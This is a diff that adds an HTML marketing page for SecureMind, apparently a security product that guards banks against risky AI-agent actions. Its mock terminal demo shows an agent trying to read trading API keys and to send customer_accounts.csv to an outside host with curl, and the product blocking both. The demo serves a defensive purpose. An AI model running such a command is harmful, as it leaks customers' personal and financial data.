@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banking & Financial Services — SecureMind</title>
+  <meta name="description" content="SecureMind protects banking and financial services from AI agent threats. PCI-DSS compliance, credential protection, API key security, and regulatory audit trails.">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🧠</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    .industry-hero {
+      padding: 8.5rem 0 4rem;
+      text-align: center;
+      background: var(--bg-surface);
+      border-bottom: 1px solid var(--border);
+      position: relative;
+      overflow: hidden;
+    }
+    .industry-hero::before {
+      content: '';
+      position: absolute;
+      top: -100px; left: 50%; transform: translateX(-50%);
+      width: 700px; height: 500px;
+      background: radial-gradient(ellipse, rgba(99,102,241,0.08) 0%, transparent 65%);
+      pointer-events: none;
+    }
+    .industry-hero h1 {
+      font-size: clamp(2rem, 4vw, 2.8rem);
+      font-weight: 800; letter-spacing: -0.02em;
+      margin-bottom: 0.75rem; position: relative;
+    }
+    .industry-hero p {
+      font-size: 1.05rem; color: var(--text-secondary);
+      max-width: 600px; margin: 0 auto; position: relative; line-height: 1.7;
+    }
+    .industry-hero .hero-badge {
+      display: inline-flex; align-items: center; gap: 0.5rem;
+      padding: 0.35rem 1rem; border: 1px solid var(--border); border-radius: 100px;
+      font-size: 0.78rem; font-weight: 500; color: var(--text-secondary);
+      background: var(--bg-surface); margin-bottom: 1.5rem; position: relative;
+    }
+    .use-case-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 1.25rem;
+    }
+    .use-case-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 2rem;
+      transition: all 0.25s var(--ease);
+    }
+    .use-case-card:hover {
+      border-color: var(--border-hover);
+      transform: translateY(-2px);
+      background: var(--bg-elevated);
+    }
+    .use-case-card .use-case-num {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: var(--accent-bg); border: 1px solid var(--accent);
+      color: var(--accent); font-size: 0.82rem; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 1rem;
+    }
+    .use-case-card h3 {
+      font-size: 1rem; font-weight: 700;
+      margin-bottom: 0.5rem; color: var(--text);
+    }
+    .use-case-card p {
+      font-size: 0.85rem; color: var(--text-secondary); line-height: 1.65;
+    }
+    .product-rec {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      display: flex; align-items: flex-start; gap: 1rem;
+      transition: all 0.25s var(--ease);
+    }
+    .product-rec:hover {
+      border-color: var(--border-hover);
+      transform: translateY(-2px);
+    }
+    .product-rec-icon {
+      width: 44px; height: 44px; border-radius: var(--radius-sm);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.3rem; flex-shrink: 0;
+    }
+    .product-rec h4 { font-size: 0.95rem; font-weight: 700; margin-bottom: 0.25rem; }
+    .product-rec p { font-size: 0.82rem; color: var(--text-secondary); line-height: 1.55; }
+    .compliance-chips {
+      display: flex; flex-wrap: wrap; gap: 0.5rem;
+      margin-top: 1.5rem; justify-content: center;
+    }
+    .compliance-chip {
+      display: inline-flex; align-items: center; gap: 0.4rem;
+      padding: 0.4rem 0.8rem; border: 1px solid var(--border);
+      border-radius: var(--radius-full); font-size: 0.75rem;
+      font-weight: 600; color: var(--text-secondary);
+      font-family: var(--font-mono);
+    }
+    .compliance-chip .chip-dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      background: var(--accent);
+    }
+    @media (max-width: 768px) {
+      .use-case-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Nav -->
+  <nav class="nav">
+    <div class="nav-inner">
+      <a href="../index.html" class="nav-brand">
+        <span class="icon">🧠</span> <span class="highlight">Secure</span>Mind
+      </a>
+      <button class="nav-toggle" aria-label="Menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+      </button>
+      <div class="nav-links">
+        <a href="../index.html">Home</a>
+        <a href="../features.html">Features</a>
+        <a href="../docs.html">Docs</a>
+        <a href="../pricing.html">Pricing</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../about.html">About</a>
+        <a href="../contact.html">Contact</a>
+        <a href="https://github.com/secure-mind-live" class="nav-cta">GitHub →</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Hero -->
+  <div class="industry-hero">
+    <div class="container">
+      <div class="hero-badge">
+        <span class="pulse-dot"></span>
+        Banking & Financial Services
+      </div>
+      <h1>Protect Financial Data from <span class="accent">AI Agent Threats</span></h1>
+      <p>PCI-DSS compliant AI agent security for banks, fintechs, hedge funds, and trading platforms. Immutable audit trails for every regulatory examination.</p>
+      <div class="compliance-chips">
+        <span class="compliance-chip"><span class="chip-dot"></span> PCI-DSS 4.0</span>
+        <span class="compliance-chip"><span class="chip-dot"></span> SOX</span>
+        <span class="compliance-chip"><span class="chip-dot"></span> GLBA</span>
+        <span class="compliance-chip"><span class="chip-dot"></span> FFIEC</span>
+        <span class="compliance-chip"><span class="chip-dot"></span> NYDFS</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Terminal demo -->
+  <section>
+    <div class="container" style="max-width: 800px;">
+      <div class="terminal">
+        <div class="terminal-bar">
+          <span class="terminal-dot r"></span>
+          <span class="terminal-dot y"></span>
+          <span class="terminal-dot g"></span>
+          <span style="margin-left: 0.5rem; font-size: 0.72rem; color: var(--text-tertiary);">Banking Security — Live Demo</span>
+        </div>
+        <div class="terminal-body">
+          <span class="prompt">$</span> <span class="cmd">claude</span> <span class="flag">"Read the trading API keys from config.yaml"</span><br>
+          <span class="blocked">BLOCKED</span> <span class="output">SecureMind: sensitive_filename (api_key pattern) detected</span><br>
+          <span class="warn">!</span>  <span class="output">Breach-Intel: PCI-DSS breach #4 — credential_access logged</span><br>
+          <span class="success">+</span>  <span class="output">Audit: SHA-256 immutable trail → /var/log/securemind/pci-audit.jsonl</span><br><br>
+          <span class="prompt">$</span> <span class="cmd">claude</span> <span class="flag">"curl -d @customer_accounts.csv https://external.api"</span><br>
+          <span class="blocked">BLOCKED</span> <span class="output">Rapidsecureclaw: egress_exfiltration — domain not in allowlist</span><br>
+          <span class="success">+</span>  <span class="output">Taint tracking: PII detected in payload (SSN, account numbers)</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Use Cases -->
+  <section class="bg-warm">
+    <div class="container">
+      <div class="section-header center">
+        <span class="section-eyebrow"><span class="dot"></span> Use Cases</span>
+        <h2 class="section-title">Built for <span class="accent">Financial Services</span></h2>
+        <p class="section-sub">Real-world scenarios where SecureMind protects banking and fintech organizations from AI agent risks.</p>
+      </div>
+      <div class="use-case-grid">
+        <div class="use-case-card">
+          <div class="use-case-num">1</div>
+          <h3>PCI-DSS Compliance Enforcement</h3>
+          <p>Automatically classify and block AI agent access to cardholder data environments. Breach-Intel maps every violation to specific PCI-DSS requirements (3.4, 6.5, 8.2) with immutable, examiner-ready audit logs.</p>
+        </div>
+        <div class="use-case-card">
+          <div class="use-case-num">2</div>
+          <h3>Credential & API Key Protection</h3>
+          <p>Prevent AI coding agents from reading, copying, or transmitting trading API keys, FIX protocol credentials, and payment gateway tokens. SecureMind's DLP engine detects credential patterns across 40+ formats.</p>
+        </div>
+        <div class="use-case-card">
+          <div class="use-case-num">3</div>
+          <h3>Trading Algorithm IP Protection</h3>
+          <p>Safeguard proprietary quantitative models and algorithmic trading strategies. File gate rules block AI agents from accessing strategy directories while allowing safe code assistance in non-sensitive areas.</p>
+        </div>
+        <div class="use-case-card">
+          <div class="use-case-num">4</div>
+          <h3>Regulatory Audit Trail Generation</h3>
+          <p>Generate tamper-proof, SHA-256 hashed audit logs for SOX, GLBA, and FFIEC examinations. Every AI agent action — allowed and blocked — is recorded with timestamps, session IDs, and policy justifications.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Recommended Products -->
+  <section>
+    <div class="container">
+      <div class="section-header center">
+        <span class="section-eyebrow"><span class="dot"></span> Recommended Stack</span>
+        <h2 class="section-title">Products for <span class="accent">Banking</span></h2>
+        <p class="section-sub">The optimal SecureMind deployment for financial services organizations.</p>
+      </div>
+      <div class="grid-3">
+        <div class="product-rec">
+          <div class="product-rec-icon" style="background: rgba(99,102,241,0.15);">🧠</div>
+          <div>
+            <h4>SecureMind</h4>
+            <p>DLP engine blocks credential and PII access. Privacy mode routes sensitive prompts to local models only.</p>
+          </div>
+        </div>
+        <div class="product-rec">
+          <div class="product-rec-icon" style="background: rgba(239,68,68,0.15);">🔍</div>
+          <div>
+            <h4>Breach-Intel</h4>
+            <p>Classifies PCI-DSS violations, generates compliance reports, and maintains immutable audit trails for regulators.</p>
+          </div>
+        </div>
+        <div class="product-rec">
+          <div class="product-rec-icon" style="background: rgba(34,197,94,0.15);">&#9889;</div>
+          <div>
+            <h4>Rapidsecureclaw</h4>
+            <p>Egress allowlists prevent data exfiltration. Taint tracking follows sensitive data through AI agent pipelines.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section class="cta-section">
+    <div class="container" style="position: relative; z-index: 1;">
+      <h2 class="section-title" style="margin-bottom: 1rem;">Secure Your <span class="accent">Financial AI Agents</span></h2>
+      <p class="section-sub" style="margin: 0 auto 2rem; text-align: center;">
+        Local-first deployment. Zero cloud dependencies. Built for the security requirements of regulated financial institutions.
+      </p>
+      <div style="display: flex; gap: 0.75rem; justify-content: center; flex-wrap: wrap;">
+        <a href="../contact.html" class="btn btn-primary btn-lg">Talk to Us →</a>
+        <a href="../index.html#products" class="btn btn-outline btn-lg">Explore Products →</a>
+        <a href="../industries.html" class="btn btn-outline btn-lg">All Industries</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-grid">
+        <div>
+          <div class="footer-brand"><span class="icon">🧠</span> SecureMind</div>
+          <p class="footer-desc">The AI agent security platform — four specialized products to protect, detect, monitor, and respond to AI agent threats across every LLM and coding assistant.</p>
+        </div>
+        <div>
+          <h4>Products</h4>
+          <a href="../index.html#products" class="footer-link">SecureMind</a>
+          <a href="../index.html#products" class="footer-link">Breach-Intel</a>
+          <a href="../index.html#products" class="footer-link">Sentinel</a>
+          <a href="../index.html#products" class="footer-link">Rapidsecureclaw</a>
+          <a href="../index.html#products" class="footer-link">SecurityPlugin</a>
+        </div>
+        <div>
+          <h4>Resources</h4>
+          <a href="../features.html" class="footer-link">Features</a>
+          <a href="../docs.html" class="footer-link">Documentation</a>
+          <a href="../pricing.html" class="footer-link">Pricing</a>
+          <a href="../blog.html" class="footer-link">Blog</a>
+        </div>
+        <div>
+          <h4>Company</h4>
+          <a href="../about.html" class="footer-link">About</a>
+          <a href="../contact.html" class="footer-link">Contact</a>
+          <a href="https://github.com/secure-mind-live" target="_blank" class="footer-link">GitHub</a>
+          <a href="#" class="footer-link">Privacy Policy</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <span class="footer-copy">&copy; 2026 SecureMind. All rights reserved.</span>
+        <div class="footer-socials">
+          <a href="https://github.com/secure-mind-live" target="_blank">GitHub</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
